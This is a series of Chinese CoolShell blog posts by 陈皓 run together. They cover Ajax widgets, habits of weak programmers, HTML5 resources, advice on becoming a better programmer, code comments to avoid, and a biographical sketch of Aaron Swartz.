老实说，我并不太清楚这些工具有什么用，看似很useless。难道是为了用来学习新的语言？就像Google的Translator的一样？就像一个并不懂中文的老外可以用Google Translator在其Facebook中整点中文耍耍酷一样，难道说，一个C#的程序员可以用这样的工具和一个Python的程序员也耍耍酷？各位看客觉得这个东西有意义吗？不过，有一点我可以确定，如果有工具把Unix/Linux下的C源码和Windows下的C源码相互自动转换，估计这会是相当划时代的，因为，这应该会让那些什么Wine或Cygwin之类的东西都统统会成为历史了。不过，这样的东西在实现上又将会有多么大的难度（OS系统API的相互转换），这个事会有可行性吗？# 你应该知道的20个Ajax技术(01-10)作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**1) TextboxList自动完成 （** **源码** **，** **演示** **）**这个控件主要来自Facebook吧，在网易的邮件里也能看到，还有hotmail等等，在文本框里输入文本不但可以出现相关数据的列表，而且选中后的字符串还会变成一个小图标。这个控件主要用在电子邮件中吧。
**2) Ajax IM即时聊天 （** **源码** **，** **演示** **）**Ajax IM是一个很牛的即时聊天的客户端，你可以使用它制作一个Web-Based的即时聊天工具，这是一个非常强大的Ajax技术。**3）即时校验用户的输入（** **源码** **，** **演示** **）**以前，检验WEB表单的输入需要放在后台，因此，用户需要提交表单数据到后台才能知道是否所填写的内容有误。Ajax把实时检测表单输入域变成了现实，如今，我们在网上已经能看到很多很多的这样的应用，比如在你注册一个用户输入一个用户名的时候，不用提交整个表单到后台，你就能知道用户名是否已被人使用。**4）即时编辑器（** **源码** **，** **演示** **）**所谓即时编辑器就是双击一下网页上的文本，于是你就要吧编辑它了，编辑完后再单击一下别的地方，编辑过的内容就会被提交到后台保存。在这里，给出的示例是一个非常小巧的即时编辑器—— inline editor**5）Ajax 式文件上传**使用Ajax上传文件会让用户得到非常好的用户体验，上网随例搜索一下，有太多太多的各式各样的文件上传的Ajax源码可以使用。然而，在coderproject网站有，你可以下载到一款非常小又非常好的Ajax程序，网址如下：。
当然，如果你要一次上传多个文件，那个这个小程序还不足以满足你。不过，你可以使用JQuery的JQUploader。**6）Fancy Upload （** **源码** **，** **演示** **）**更为迷人的文件上传程序，你可以试试Fancy Upload，它通非常优秀的Javascript框架MooTools()构造。**7）点击记录ClickHeat （** **源码** **，** **演示** **）**ClickHeat是一个非常简单而非常强大的Ajax技术，它可以记录下访问者们对你网站的点击坐标，以便于你分析你网站的访问者的习惯和他们的关注点。**8）Ajax电子邮件表单 （** **源码** **，** **演示** **）**这里主要推荐一款叫Maillist的Ajax程序，这是用来校验并提交电子邮件的地址的（不需要刷新页面），这样的设计极大地方便了用户的使用邮件订阅某些更新。我们想想看，这样的用户体现绝对会让你网站的用户特别愿意提交他们的电子邮件。**9) Ajax目录管理器 （** **源码** **，** **演示** **）**使用Ajax做一个在线的WEB的目录浏览器是非常酷的事情，如果没有Ajax，这样的用户体验除上让用户装一个ActiveX控件，我们几乎无法在Web上实现。在这里，我们推荐Relay这个框架，它基本上有这样一些功能，a)支持文件拖拉，b)动态地载入文件目录列表， c)还有上传的进度条，d)支持多用户帐号。还有很多很多。Relay绝对实现了你所能想得到的功能。
**10）Ajax邮件客户端**目前，太多太多的邮件系统越来越多的使用Ajax技术。在用户体验方面，Gmail和网易邮箱最好。Hotmail的界面和outlook很相似了，可惜的是hotmail的运行速度感觉就像一辆后面拖着大石头的跑车。如果你想要开发一个Ajax的邮件客户端，那么，你一定要读一下下面的这篇文章：# 粉丝眼中的操作系统作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在发布完《程序员眼中的编程语言》一文后，发现网上还有一个关于操作系统的。如下所示。* 图片的横轴是三大操作系统。   * 纵轴是各操作系统的粉丝和信徒。   * 中间的各个小图片则是，粉丝眼中的操作系统的形象。关于操作系统，还有这一张图也很有意思。!粉丝眼中的操作系统# 弱爆程序员的特征值作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn【 **感谢网友sumtec投递此文，很欢乐也有意思，与大家共勉**】首先说明：1、以下特征是真实遇到过的，同事犯过的，乃至我自己也犯过的；   2、为了剧情需要，某些例子进行了一些夸张修饰等演绎创作，如无雷同，请勿生气；   3、如果你出现过以下症状之一，并不代表你就是弱爆了，但是如果你一直出现，乃至一说到这个大家就能联想到你，那么你就得小心了；   4、如果你是集这几个的大乘者，恭喜你，你已经找到了离开这个行业的充足理由了。
目录* 好了，搞定！   * 那估计是他的Bug   * 无图无真相！   * 那是个对象！   * 集大成者#### 好了，搞定！“那个Bug解决了吗？”“好了，搞定！”“这么快？”正当你非常欣喜的时候，就传来了噩耗：刚才还能编译成功的，就失败了。（好吧，我们的集成编译尚未成功配置上，理论上这种事情应该会被退回。）又或者能编译成功，但是呢，原来明明能起作用的一个下拉框，突然发神经的不起作用了。最隐蔽的莫过于，一切正常，但是当你看到代码的时候，你就晕厥过去了。比如我们曾经发现了一个Bug，简单说就是每次用户点击某个东西，就会执行下面的这段C#代码：`controlPropertyPanel.PropertyChanged += this.UpdatePropertyOnChanged;`这个Bug很明显会导致速度越来越慢，因为同一个更新操作会被更新N次，并且这个N会越来越大。其实这个Bug已经够弱了，但是后来居然被修改为：controlPropertyPanel.PropertyChanged -= this.UpdatePropertyOnChanged;     controlPropertyPanel.PropertyChanged += this.UpdatePropertyOnChanged;
这段代码能编译，能执行，但是就是弱爆了。因为这不仅仅没有从根本上去掉造成问题的逻辑，还会带来更多的困惑：为什么要先减后加呢？这类特征，请大家看看有趣的《各种流行的编程风格》，我这个例子算是一种撞大运。我觉这吧，这类问题都是因为只想解决一些表面的东西为目的，完全不管底下的其它任何问题而造成的。#### 那估计是他的Bug“这个问题为啥还没解决呢？”“我觉得应该是他那里边的Bug，我调不了。”“哦……”这个“他”可以是某一位同事，或者前同事，或者微软，或者别的什么公司，再或者某个开源代码的作者。这些个我都遇到过，比如说是另一位现在在职的同事吧。当你告诉这位同事这个Bug似乎在他那儿，并且问问什么时候解决，他也许会很愧疚的立刻调试，可最后结果却仍然是开头对话主人翁的所写代码的问题。再比如说是微软吧，那么对话可能就会包括：“啊，SilverLight真是烂，老是内存泄漏、崩溃等……”“是啊是啊！烂死了！早知道用Flash了。”又或者会说：“微软就是烂，Java就是好。”其实，我不想比较什么SilverLight还是Flash，.NET还是Java。因为在讨论这些问题之前，先最好想想，这真的是别人的错么？相信是其他人的错是一件很简单的事情，因为这样推脱之后你就可以啥都不做了，反正不是我的错。
如果真的发现了这是别人的Bug并证明了，那倒好说。但这种特征是一种纯粹的怀疑，并没有丝毫的证明。在仔细找了自己所有可能犯的错之后，如果你怀疑是别人的问题，那请求证一下。#### 无图无真相！“楼主，无图无真相啊！”“楼主，无代码无真相啊！”“楼主，给翻译一下啊！”据说Linus在别人询问Linux内存管理的一个什么问题时，回答道“Read the fxxxing source code”，很多时候我也有类似的冲动。我发现在信息发达的时代，不少人的阅读能力、动手能力都严重退化了。这些人最好就是你亲自来帮他把问题解决了，他才不想了解里面到底 发生了什么。这种问题体现在博客里面，就是寄希望于你写得图文并茂，图嘛最好花里胡哨同时言简而意概，文字嘛最好大段大段的代码。其实图不是重要的，只是为了好看，重点是代码，这样他一Copy就可以直接解决他们的问题了。比方说，Silverlight里面没有各种图像格式的编码器，于是当你希望保存Jpg的时候怎么办呢？Google一下，发现原来有人写过一个FluxJpeg的编码器。下载下来一跑，唉还真能用哎。之后就直接签入，也不捎带看一下有没有什么问题，或者设计不合理的地方。（其实真的有，会很慢，因为有大量毫无必要的数组拷贝。）
又或者说，遇到了某个Bug，搜索一下发现，哎，还真有人遇到过，而且还有代码哎！把代码扒下来一跑，发现好像解决了，至于为什么就不管了。甚至还遇到过根本就不管解决不解决问题，反正代码扒下来了就签入了的。再比如，写一篇博客讲解如何缩减.NET编译出来的文体大小，其中提到许多概念需要先阅读微软官方的一个文档。结果，还是会有人回复说，你那个文章里面提到那么多的Blob，也不说说Blob里面都有什么，大概是很不满意吧。可是这个文档里面都有啊，难道就不能自己阅读一下？其实即便我连这个文档都没有给出，自己也应该有这个能力去进行思考，去动手寻找。千万不要退化成一个啥都要别人给你嚼烂了才能够吞下去，吞下去也不会消化吸收的人。这样的人大概别人给的是大便，只要有代码无真相，也会照样吃下去的。若真如此，那你打算如何提高呢？#### 那是个对象！“这个ExpressionVisitor，它是用来干什么的？”“……”“好吧，或者这么说，他是一个什么东西？”“他是一个对象！”“啊？”“哦，是一个对象的实例。”大概这样的回答，和那个微软工程师说“你在直升飞机上”差不多——反正你也不能说是错的，但是就是没什么意义。其实不知道没啥问题，人又不是神，怎么可能都知道呢？不去仔细了解和学习问题也不严重，因为你可以改。但是当你习惯性的随便找一个绝对没错但又不说明任何问题的答案，甚至似是而非的东西来对付的时候，你就离弱爆的边缘很近了。
当然，上面的对话也许是比较极端的。一个稍弱一点的对话版本是：“这个内存泄漏是怎么造成的呢？”“嗯，会不会是图片放的位置不对呢？”哈，还是很夸张对吧？没办法，写博客有时候需要夸张的文字，否则你无法理解我的意思是：有时候，大家会倾向于从自己的记忆中寻找一些相似的物品，然后选择相似度自认为比较高的东西出来当作答案，而全然不管两者之间的逻辑是否有哪怕那么一丝的关联。也许很多时候，我们确实需要从相似的东西开始，但请别把他当作终点。程序是需要严谨的逻辑的，所以你也必须非常严谨的去推演。关于这类的问题真的太多太多了，比如我指着下面这段代码当中的红字：var dictionary = new Dictionary<string, string>();   dictionary **[“someKey”]** = “someValue”;“这句话说明了什么？”“说明dictionary是一个数组。”#### 集大成者最后我举一个集大成者的例子，说，有个任务是要在SilverLight应用上面添加一个“收藏本站点”。好，怎么解决呢？网上一搜，发现有很多这样的代码：然后直接扒下来就放上去了，通过某种方式在SilverLight中调用这段JavaScript，签入，搞定了！结果到了测试那边发现完全不能用，无论在IE6/7/8/9/10，还是在FireFox/Safari/Chrome上面，都不能使用。我问：
“这是什么原因呢？”“不知道，反正浏览器报告没有权限，可能是浏览器的安全设置原因吧，或者操作系统的Bug，也可能是浏览器的某种Bug？”“不可能啊？这些代码存在很多年了，要有问题早就能在网上搜索到了。”“那也许是SilverLight调用的时候有什么安全问题。哎！SilverLight好烦啊！”“那怎么还没有解决呢？”“好，我马上解决它！”很快，那段Javascript就变成了：function AddBookmark(Url, LabeName) {     try     {     if (document.all)     {     window.external.addFavorite(Url, LabeName);     }     else if (window.sidebar)     {     window.sidebar.addPanel(LabeName, Url, '');     }     }     catch     {     alert("您的浏览器因为安全设置的问题无法收藏，请手动添加收藏！");     }     }看到这样的代码，我彻底震惊了。亲自调试了一下，发现确实报告了一个“没有权限”的异常。但是，我还发现，那个Url参数的值是“www.adomainname.com\test\page.html”。那这不废话么！浏览器认为你要收藏的是一个本地硬盘上的路径，怎么可能在一个Internet Zone上允许收藏这种路径呢？我于是指着代码问：
“这个Url是什么？”“是一个变量”“啊？”“哦，不对，是一个参数。”你是否也有类似的经历呢？（全文完）# 几个Web的资源作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn首先一个先给大家介绍一个HTML5的资源网站： ，在这个网站上，有三个子站：1. HTML5的幻灯片：，虽然是英文的，但相信我，这个幻灯片做得很好，你应该能看得懂。   2. HTML5的操练场：，这个页面上有很多HTML5的源码，你可以就直接在上面修改，并查看修改结果。   3. HTML5的教程：，这个页上有一些Steps by Steps的教程，很不错。第二个，给大家推荐一个Javascript库，叫——DragDealer。这个JS主要是处理Web上的各种拖动效果，脚本很小，在没有压缩的情况下也只有12K，而且没有任何的dependence，使用起来也比较方便。第三个，是Apple的Showcase，我们都知道，iPhone不支持flash，但支持HTML5，大家可以点下面这些链接看看Apple公司自己做的HTML5的一些效果。当然，有一些需要safari浏览器。
* Video effects   * Web typography   * Web gallery   * Photo transitions   * Audio   * 360°   * VR   * Canvas pixel manipulation   * Sticky notes   * Concert Poster   * Checkers   * Light table   * Offline calendar   * Movie trailers如果大家也有一些相似的资源，不妨一起来分享。# 把Flash转成Javascript/HTML5作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnSmokeScreen是这样一个开源软件，它可以把Flash的swf文件转成Javascript/HTML5，它的口号是：Flash without plugin。为什么要这样做呢？它说主要是因主Apple的iPhone/iPod/iPad不支持flash，而且看似Steve Jobs也不愿意在以后支持flash。所以，他们搞了这样一个玩意。目前，这个开源软件还在开发阶段，在其主页上，你可以看到一些Demo，在Chrome上看上去很不错，虽然还有一些小问题，不过已经很不错了。
HTML5几乎颠覆了原来的HTML，其可以让你用HTML不单单只是做网页布局，而且还让你可以开发更强的东西，比如：WebSockets，使用这项技术，已经有人在搞Web版的Quake 2了（http://code.google.com/p/quake2-gwt- port/），还有Google的3D Javascript API，所以，把swf完美地转成Javscript/HTML5可能也只是一个时间问题。虽然，HTML5还在draft阶段，而且很多东西都和flash重复了。所以，加上iPhone的推波助澜，发生这样的事情也不奇怪，不知道adobe会怎么想？也许adobe目前对其AIR或是Actionscript还抱有希望，虽然有这样一篇文章力挺Flash，但未来真的不好说，adobe会使用HTML5/Javascript来作为其flash的引擎吗？如果不这样的话，我相信总有一天，会有人开发出HTML5/Javascript的IDE。而且，有理由相信，一旦在未来所有的浏览全面支持HTML5，那么我们可以想像，这个世界可能几乎所有的桌面应用都会被Web所取代，这个进程可能会越来越快。让我们拭目以待。
# 五个方法成为更好的程序员作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn对我来说，一个好的程序员应该是努力去追求尽可能无错的高质量的符合需求的代码实现。 一些人也许认为好的程序员是那些懂得多门编程语言，懂得很牛技术的程序员，是的，这在某些情况下是对的。但归根到底，无论你用什么样的技术，什么样的语言，所有的程序被写出来，其功能都要符合需求以及尽可能地健壮无错和高质量。 我们可以想像一下，如果一个能力普通的程序员有足够多的时间来做测试，那么，其也可以保证他的代码的质量。所以，有一种观点这样认为——要达到质量高的代码只需要有足够多的时间来做测试。这对于以结果为导向的商业软件开发中是可以理解的（我们可以看到那些制汽车的产商在汽车测试上花费的精力和时间就可以明白这一道理）。但是，很明显，所有的已经开发出来项目都是在不完美的条件下开发出来的，一般来说，几乎所有的项目都是在最大化程序员软件的开发速度。而且，很多情况下，我们似乎对深度测试和压力测试并不是很关心，所以，我们总是在祈祷并期望那些赶工出来的代码可以正常工作，尤其是在上线的时候，这种唯心主义的价值观更为强烈。 其实，开发速度和软件产品质量并不矛盾。 **好的程序员并一定是技术强的程序员，而是那些可以在不完美的工作环境下保证软件质量和工作效率的程序员** 。下面是是五个程序员可以在这种不完美的情况下做得更好的观点（它们都和语言和技术没什么关系，只不过是一种你的工作行为，能够和所有的行业相通），这五个观点也许可以让你成为这样的好程序员。
***** **寻找不同观点：** 程序员好像并不喜欢技术上有异见的人，他们特别喜欢争论各自的技术观点。但是，他们忽略了不同观点的价值。任何事情都有好有坏，我们应该学会在不同观点中学习和平衡。这样才会更多的了解编程和技术。要经常在做事之前问自己和别人，这么做对不对？做完事后问自己，还可不可以改进？努力去寻找别的不同的观点或方法。程序员应该经常上网，经常和同事讨论不同的实现方法，不同的技术观点，这样才能取长补短。然而，在实际工作中，我发现程序员们并不喜欢互相请教，因为请教的人怕别人看不起他，而被请教的人总是先贬低对方的能力，哎……（参看《十个让你变成糟糕的程序员的行为》），如果有这样的文化氛围的话，那也没有关系。上网吧，网上的人谁也不认识谁，可以尽情地问一些愚蠢的问题。呵呵。总之，一定要明白，如果某些事情只有一个观点，那么你一定要怀疑一下了，没有观点和技术方案的比较，没有百花齐放的情况，你就无法知道是否还有更好的东西。真正的和谐不是只有一种声音，真正的和谐而是在不同的观点声音下取长补短，百家争鸣（参看《十条不错的编程观点》）。否则，你永远都不会接受到新的观点，也就无法进步和成长了。****
* **千万别信自己的代码** : 在任何时候，一定要高度怀疑自己的代码。很多时候，错误总是自己造成的。所以，当出现问题的时候，要学会review代码中所有的可疑点，千万别觉得某段代码很简单，可以略过。事实证明，很多疏忽大意都是在阴沟里翻的船，都是那些很低级的错误。在查错的过程中，切忌过早下结论，切忌四处乱改（参看《各种流行的编程风格》），停下来，想一想，会是哪儿的代码有重大嫌疑，然后查看一下代码，捋一捋程序的逻辑（参看《橡皮鸭程序调试法》），调试并验证一下程序的逻辑和变量在运行时是否是正确的。很多时候，对于那些难缠的问题，最后解决了总是因为我们开始认真回头审视所有的代码。只有对自己的代码保持着高度的怀疑，这样我们才会想着如何让其运行得更好更稳定，也会让我们在单元测试中下更多的功夫，这样才能更能在那忙碌的环境中节省时间。相信我，在集成测试中fix bug的成本要比在单元测试Fix bug的成本大得多的多。一个简单的例子就是memory leak。程序员对自己的程序需要有忧患意识，这样才会越来越成熟，而自己的能力也会越来越强。***** **思考和放松** : 做事前多想一想，这样做事的时候就不会不顾此失彼，手忙脚乱，一旦事情一乱，你的心情也会更乱，于是，事情也就会更乱。最后，你只得重写，这种事情太多了。而且，在工作中要学会享受，要学会放松心情，我并不是让你工作的时候聊QQ，我只是说，有时候，心态过于紧张，压力过大，你的工作成果反而更不好，从而又反过来造成新一轮的焦虑和紧张。我个人认为， **思考和放松是可以完美统一的** ，思考其实就是一种放松，停下来，休息一下，回头看看走过的路，喝口水，登个高，看看过去走的对不对？总体是个什么样？总结一下，然后看看前路怎么样好走，这会你才会越走越好，越走越快。好的程序员都不是那种埋头苦干的人，好的程序员总是那些善于总结成败得失，善于思考，善于调整，善于放松的人（参看《优秀程序员的十个习惯》）。不然，我能看到的情形是，你很快地把事干完，回到家刚坐下来，老板或是客户就打电话来告诉你你的程序出问题了。总之，深思熟虑，动作会很慢，但是你可以保证你工作成果的质量，反而能让你更多的节约时间。
***** **学习历史，跟上时代** : 如果你是从十年前开始编程的，那么，今天的这门语言或是技术会有很多很多的改进和改善。你以前开发一个功能或函数，今天早已被集成时了语言中，而且做得比你的版本要好得多。以前你需要100行代码完成的事情，今天只需要1行代码。这样的事情在未来还会发生，所以，今天的你一定要学会如何跟上时代。但是，你也不要放弃历史，我现在看到很多程序员对一些现代的语言和技术使用的非常好，他们可以很容易地跟上时代。但不要忘了，计算机世界的技术更新和技术淘汰也是非常猛的。所以，你一定要学习历史，这些历史不是产商的历史，而是整个计算机文化的历史（参见《Unix传奇》）。只有通过历史，你才能明白历史上出现的问题，新技术出来的原因，这样才能够对今天的这些新的技术更了解，也才能明白明天的方向在哪里。学习历史和跟上时代都是相当重要的。使用新型的技术，停下来接受培训，可以让你工作得更快，更高效（参看《未来五年程序员需要掌握的10项技能》）。而学习和总结历史，才会让你在纷乱的世界中找到方向。***** **积极推动测试活动** : 只有测试才能证明软件可以正常工作，只有测试才能保证软件的质量。无论什么产品，都需要经过或多或少的测试。测试地充分的产品或模块，你会发现其质量总是那么好，测试的不充的产品，质量总是那么次。德系汽车，日系汽车质量怎么样，关键还是在于怎么去测试的，测试的是否充分。所以，在你开发软件的过程中，如果你说你的程序写地好，质量高，那么请你拿出实实在在的测试报告。在整个软件开发过程中，做为一个好的程序员，你应该积极地在各个环节推动项目组进行测试活动。不要以为技术需求阶段和设计阶段不需要测试，一样的，只要你要release什么，release的这个东西都需要进行测试。技术需求怎么做测试？用户案例就是测试案例。在软件开发的整个过程中，保证产品质量有时候比实现需求更重要，尤其是那些非常重要甚至人命关天的产品。
上面这些五个观点都是可能让你在不完美的工作环境中可以工作得更好，更快，更高效，希望能够对你有用。另外，也欢迎你留下你的观点！（全文完）# 五种应该避免的代码注释作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在酷壳，有很多文章都提到了代码注释，如：《十条不错的编程观点》、《优质代码的十诫》、《整洁代码的4个提示》、《惹恼程序员的十件事》等等。今天，某国外的程序员在 **这里**列举五种应该避免的程序注释，我觉得比较有道理，但我觉得有少数几个观点也并不绝对。所以，我把原文的这五种应该避免的程序注释罗列在下面，并放上原作者和我的个人观点作为比较。希望对大家有用。### 一、自恋型注释（注：原文为Proud，我觉得“自恋”更好一点）**原文** ：这样的程序员对于自己的代码改动非常骄傲和自恋，所以，他觉得需在在这些自己的代码上标上自己的名字。其实，一个版本控制工具（如：CVS或Subversion）可以完整地记录下所有的关于代码的改动的和作者相关的一切信息，只不过不是那么明显罢了。**陈皓** ：我同意原文的观点。在我的团队里也有这样的事情发生。有段时间我认真思考过这样的事情，是否应该把这样的事情在代码中铲除出去。后来，我觉得，允许这样的行为并不一定是坏事，因为两点：
1. 调动程序员下属的积极性可能更为重要。即然，这种方式可以让程序员有骄傲的感觉，能在写代码中找到成就感，为什么要阻止呢？又不是什么大问题。   2. 调动程序员的负责任的态度。程序员敢把自己的名字放在代码里，说明他对这些代码的信心，是想向大家展示其才能。所以，他当然知道，如果这段他加入的代码有问题的话，他的声誉必然受到损失，所以，他敢这么干，也就表明他敢于对自己的代码全面的负责。这不正是我们所需要的？！所以，基于上述考虑，我个人认为， **从代码的技术角度上来说，这样的注释很不好。但从团队的激励和管理上来说，这样的方式可能也挺好的** 。所以，我并不阻止也不鼓励这样的注释。关键在于其是否能有更好的结果。### 二、废弃代码的注释**原文** ：如果某段代码不再使用了，那就应该直接删除。我们不应该使用注释来标准废弃的代码。同样，我们有版本控制工具来管理我们的源代码，在版本控制工具里，是不可能有代码能被真正的物理删除的。所以，你总是可以从以前的版本上找回你的代码的。**陈皓** ：我非常同意这样的观点。只要你是废弃的，就应该是删除，而不是注释掉。注释并不是用来删除代码的。也许你会争论到，在迭代开发中，你觉得被注释的代码很有可能在未来会被使用，但现在因为种种问题暂时用不到，所以，你先注释着，然后等到某一天再enable它。所以你注释掉一些未来会有的程序。在这样的情况，你可以注释掉这段代码，但你要明白，这段代码不是“废弃”的，而是“临时”不用的。所以，我在这里提醒你，请不要教条式地在你的程序源码中杜绝这样的注释形式，是否“废弃”是其关键。
### 三、明显的注释**原文** ：看看上面的例子，代码比注释还容易读。是的，大家都是程序员，对于一些简单的，显而易见的程序逻辑，不需要注释的。而且，你不需要在你的注释中教别人怎么编程，你这是在浪费时间去解释那些显而易见的东西。你应该用注释去解释你的代码功能，原因，想法，而不是代码本身。**陈皓** ：非常同意。最理解的情况是你的代码写得直接易读，代码本身就是自解释的，根本不需要注释。这是最高境界。注释应该说明下面的代码主要完成什么样的功能，为什么需要他，其主要算法怎么设计的，等等。而不是解释代码是怎么工作的。这点很多新手程序员都做得不够好。别外，我需要指出的是，代码注释不宜过多，如果太多的话，你应该去写文档，而不是写注释了。### 四、故事型注释**原文** ：如果你不得不在你的代码注释中提及需求，那也不应该提及人名。在上面的示例中，好像程序想要告诉其它程序员，下面那些代码的典故来自销售部的Jim，如果有不懂的，你可以去问他。其实，这根本没有必要在注释中提到一些和代码不相干的事。**陈皓** ：太同意了。这里仅仅是代码，不要在代码中掺入别的和代码不相干的事。这里你也许会有以下的争辩：
1. 有时候，那些所谓的“高手”逼着我这么干，所以，我要把他的名字放在这里让所有人看看他有多SB。   2. 有时候，我对需求并不了解，我们应该放一个联系人在在这里，以便你可以去询问之。对于第一点，我觉得这是一种情绪化。如果你的上级提出一些很SB的想法，我觉得你应该做的是努力去和他沟通，说明你的想法。如果这样都不行的话，你应该让你的经理或是那个高手很正式地把他的想法和方案写在文档里或是电子邮件里，然后，你去执行。这样，当出现问题的时候，你可以用他的文档和邮件作为你的免责证据，而不是在代码里干这些事。对于第二点，这些需求的联系人应该是在需求文档中，如果有人有一天给你提了一个需求，你应该把其写在你的需求文档中，而不是你的代码里。要学会使用流程来管理你的工作，而不是用注释。最后，关于故事型的注释，我需要指出也有例外的情况，我们团队中有人写注释喜欢在注释或文档里写一些名人名言（如 22条经典的编程引言，编程引言补充，Linus Torvalds 语录 Top 10 ），甚至写一些小笑话，幽默的短句。我并不鼓励这么做，但如果这样有利于培养团队文化，有利于让大家对工作更感兴趣，有利于大家在一种轻松愉快的环境下读/写代码，那不也是挺好的事吗？
另外，做为一个管理者，有时候我们应该去看看程序员的注释，因为那里面可能会有程序员最直实的想法和情绪（程序员嘴最脏??）。了解了他们的想法有利于你的管理。### 五、“TODO”注释public class Program     {     static void Main(string[] args)     {     //TODO: I need to fix this someday – 07/24/1995 Bob     /* I know this error message is hard coded and     * I am relying on a Contains function, but     * someday I will make this code print a     * meaningful error message and exit gracefully.     * I just don’t have the time right now.     */     string message = "An error has occurred";     if(message.Contains("error"))     {     throw new Exception(message);     }     }     }
**原文** ：当你在初始化一个项目的时候，TODO注释是非常有用的。但是，如果这样的注释在你的产品源码中出现了N多年，那就有问题了。如果有BUG要被fix，那就Fix吧，没有必要整一个TODO。**陈皓** ：是的，TODO是一个好的标志仅当存在于还未release的项目中，如果你的软件产品都release了，你的代码里还有TODO，这个就不对了。也许你会争辩说，那是你下一个版本要干的事。OK，那你应该使用项目管理，或是需求管理来管理你下一个版本要干的事，而不是使用代码注释。通常，在项目release的前夕，你应该走查一下你代码中的TODO标志，并且做出决定，是马上做，还是以后做。如果是以后做，那么，你应该使用项目管理或需求管理的流程。上述是你应该避免使用的注释，以及我个人的一些观点，也欢迎你留下你的观点！# 互联网之子 – Aaron Swartz作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!Aaron_Swartz_profile 1986年11月8日，有个叫Aaron Swartz的人在美国芝加哥伊利诺伊州出生。因为他父母创办了一个软件公司，所以，Aaron在3岁的时候就接触到了电脑，然后就着迷了。
我们先通过Aaron Swartz 的青少年时期来看一下他是怎么样的一个天才：12岁的时候Aaron就创建了一个类似于Wikipedia式的网站（那时还没有Wikipedia），13岁的时候，Aaron赢得为年轻人而设，创作教育及协同非商业网站的ArsDigita Prize比赛首名。 奖品包括参观麻省理工学院及与网际网路界的知名人士见会。14岁的时候，他就成为了RSS1.0的开发组的一员。（后来，他和 John Gruber一起开发了Markdown）15岁的时候，进入W3C的 RDF 核心工作组，并写了RFC3870——这个文档描述了一个新的media type – “RDF/XML“，用于定义互联网上的“语义网络”17岁进入斯坦福大学，1年半后，18岁的时候因为受不了教条式的教育缀学，并通过Y Combinator公司的夏季创办人计划成立Infogami软件公司，在那里，他设想了一个Wiki平台来实现他的Internet Open Library——一个开放的网络图书馆。并写了著名的web.py 开发框架。但他觉得自己太年轻，还要有一个合伙人，于是Y Combinator建议他和Reddit合并。于是他在19岁的时候成了Reddit的创始人
虽然Reddit不挣钱，但是相当火，当他20岁的时候（2006年10月），他们把Reddit卖给了Condé Nast出版社，据说挣到了百万美金。然后，他去了这家出版社工作，受不了办公室的那种工作环境，2007年1月离职。但是，你能想得到这么天才的一个人，于2013年1月11日自杀了么？那年他才26岁。从前面Aaron的经历我们可以看到，他是一个特别喜欢Wiki的人，也是非常喜欢开放的人，但并不喜欢那些有CopyRight的东西，也也不喜欢那些循规蹈矩的东西，他喜欢质疑，他喜欢打破常规，他用生命坚持着互联网真正的开放精神。但是这样一来，必然会和守旧的世界相冲突。他在YC搞的那个Internet Open Library（互联网开放图书馆）的项目，他就想把那些没有Copyright的书籍和学术期刊放在网上让全世界的人免费查阅。 **他就认为固体的图书馆遮蔽了知识的传播，互联网理应成为连接书籍，读者，作者，纸张与思想的最好载体，他非常痛恨任何一家巨型的机构独吞所有书籍的做法。他想把Public Access 变成 Public Domain** 。在他的青少年时期，他就在不懈地和一切限制信息自由交换和自由共享的做法做斗争。这是他认为的互联网精神，他同时也觉得这和美国民主自由的宪法的精神是一致的。
其中有一个例子是这样的，美国法院行政办公室有一个叫 PACER)（Public Access to Court Electronic Records） 的政府服务。这个服务会把法庭记录的文件放在网上，如果你要看的话，一页要付费8美分（注意是每页，不是每个文档，美国政府说这只是成本式的收费），这个事他非常不能理解，他觉得这些文件本来就属于公众，没有CopyRight，为什么属于公众的东西还要收费。PACER这个服务每年可以为政府带来1.2亿美金的收入。于是Aaron在2008年9月4日到20日，他22岁的时候，他用Perl在AWS上写了一个程序，从PACER上下载了270万的文档（2000万页，纽约时报里说他下载大约是总量的20%，但是也有人不到总量的1%）。于是FBI对他调查了两个多月，但最终没有对他起诉。（今天，PACER还在收费，不过你可以使用一个叫RECAP的Firefox插件来免费浏览当年Aaron下载的相关的法律文档）2008年同年，Aaron创建了Watchdog.net – “the good government site with teeth” 专门用来收集和呈现和政客相关的数据（这个网站访问不到了，不过你可以在Aaron的blog上看一下他的想法）。然后，他还起草了 _Guerrilla Open Access Manifesto_ （中文版） __ 下面是节选
> > 信息就是能源。但就像所有能源一样，有些人只想占为己有。世界上所有的科学和文化遗产，已在书籍和期刊上发布了数个世纪，正渐渐地被少数私有的公司数字化并上锁。想要阅读那些有着最著名研究成果的论文？你必须支付给如 > Reed Elsevier 这样的出版商大把钱。 > > …… …… > > > 我们要夺回信息，无论它们被存在何处，制作我们的副本并和全世界分享。我们要取到版权到期的东西并将它们归档，我们要买下秘密的资料库并将它们放到网上。我们要下载科学期刊并将它们上传到文件分享网络。我们要为游击队开放访问而战。 > > 只要全世界有足够多的我们，那就不仅是传达了一个反对知识私有化的强有力信号，我们还将让它成为过去。你愿意和我们一起吗？ > > 亚伦·斯沃茨 (Aaron Swartz) 2008 年 7 月，意大利 EremoAaron觉得那些对人类有价值的科学和文化遗产属于全人类，美国大学每年会向那些出版学术期刊、论文的机构（比如 ISI，Jstor）支付许可费用，许可费用极高，他觉得这是这个时代的悲剧。于是完美主义的他产生了一种责任感。2009年，他成立了Progressive Change Campaign Committee（进步改变运动委员会），2010年，他又创建了 Demand Progress （求进会）——利用互联网来组织群众与议会和政府对话。
